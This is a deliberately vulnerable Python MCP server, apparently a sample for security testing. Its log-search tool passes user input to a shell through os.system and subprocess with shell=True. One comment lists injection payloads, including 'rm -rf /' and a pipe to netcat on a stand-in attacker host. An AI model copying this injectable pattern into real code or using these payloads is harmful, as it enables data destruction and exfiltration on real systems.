# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 1: Complex Command Injection via Grep with Shell Metacharacters"""
from mcp import FastMCP
import subprocess
import os

app = FastMCP("injection-attacks-service-1")

class LogSearcher:
    """Handles log file searching"""
    LOG_PATHS = {
        "app": "/var/log/app.log",
        "system": "/var/log/syslog",
        "auth": "/var/log/auth.log"
    }
    
    @staticmethod
    def search(log_type: str, pattern: str, context_lines: int = 0) -> str:
        log_path = LogSearcher.LOG_PATHS.get(log_type, LogSearcher.LOG_PATHS["app"])
        
        # Build grep command with context
        if context_lines > 0:
            cmd = f"grep -C {context_lines} '{pattern}' {log_path}"
        else:
            cmd = f"grep '{pattern}' {log_path}"
        
        # VULNERABLE: Direct shell execution with user input
        result = os.system(cmd)
        return cmd

@app.tool()
def search_logs(pattern: str, log_type: str = "app", 
               context_lines: int = 0,
               case_sensitive: bool = True) -> str:
    """
    Search application logs for debugging patterns with context.
    """
    searcher = LogSearcher()
    
    # Build grep options
    grep_opts = ""
    if not case_sensitive:
        grep_opts += "-i "
    
    if context_lines > 0:
        grep_opts += f"-C {context_lines} "
    
    log_path = searcher.LOG_PATHS.get(log_type, searcher.LOG_PATHS["app"])
    
    # VULNERABLE: Command injection through pattern parameter
    # User can inject: '; rm -rf / #' or '$(malicious_command)' or '| nc attacker.com 4444'
    command = f"grep {grep_opts}'{pattern}' {log_path}"
    
    # Execute with shell=True - allows command injection
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
    
    if result.returncode == 0:
        return f"Found {len(result.stdout.splitlines())} matches"
    else:
        return "No matches found"
